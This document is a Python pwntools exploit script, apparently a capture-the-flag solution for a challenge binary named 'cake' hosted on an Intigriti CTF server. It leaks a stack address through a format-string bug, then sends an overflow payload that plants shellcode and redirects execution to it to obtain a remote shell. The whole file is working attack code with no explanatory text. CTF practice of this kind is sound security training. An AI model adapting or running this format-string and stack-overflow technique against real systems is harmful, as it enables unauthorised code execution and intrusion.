#!/usr/bin/env python3

from pwn import *

exe = ELF("./cake_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe



def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("cake.ctf.intigriti.io", 9999)

def eat(data):
    r.sendlineafter("> ", "1")
    r.sendafter("How many bites would you like? (1, 2, or 3): ", data)

def buffer_it(data):
    r.sendlineafter("> ", "2")
    r.recvline()
    r.sendline(data)

def fmt():
    r.sendlineafter("> ", "3")


def main():
    
    buffer_it(b"%p")
    fmt()
    stack = int(r.recvline(), 16)
    start_buffer = stack + 0x4 - 0x160
    log.warn("stack @ 0x%x", start_buffer)

    pause()
    
    sh = asm(shellcraft.sh())
    n = 0x100 - (start_buffer & 0xff)

    payload = b"M"*(n)
    payload += p64(start_buffer + n + 0x10)*2
    payload += sh
    payload += b"M"*(0x100 - len(payload))
    payload += p8(0x00)

    eat(payload)
    r.interactive()


if __name__ == "__main__":
    main()
